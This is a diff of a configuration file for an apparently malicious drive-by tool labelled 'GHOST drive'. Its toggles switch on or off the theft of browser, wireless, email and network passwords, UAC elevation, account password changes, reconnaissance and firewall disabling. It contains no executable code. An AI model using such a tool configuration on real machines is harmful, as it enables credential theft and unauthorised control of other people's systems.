@@ -1,12 +1,12 @@
 # ->initializing controls
 exec_mode = "normal"
-uac_elevation = 1
+uac_elevation = 0
 duplicate_exec = 1
-multi_arch = 1
+logging = 1
 
 # ->completion controls
 msgbox = {
-    'controller': 1,
+    'controller': 0,
     'title': "GHOST drive",
     'msg': "Driveby complete",
     'buttons': 0
@@ -23,7 +23,7 @@ browser_pwds = 0
 wireless_keys = 0
 email_pst_pwds = 0
 mail_pwds = 0
-network_pwds = 1
+network_pwds = 0
 msn_pwds = 0
 dialup_pwds = 0
 
@@ -36,13 +36,14 @@ change_nt_pwd = {
     'diff_acc_pwd': "a password"
 }
 
-# ->recon
-batch_info = 0
+# ->reconnaissance
+batch_recon = 0
 network_scan = 0
+sysinfo = 1
 
 # ->network based executions
-deactivate_firewall = 0
-activate_firewall = 0
+disable_firewall = 0
+enable_firewall = 0
 release_net_adapters = 0
 renew_net_adapters = 0
 flush_dns = 0
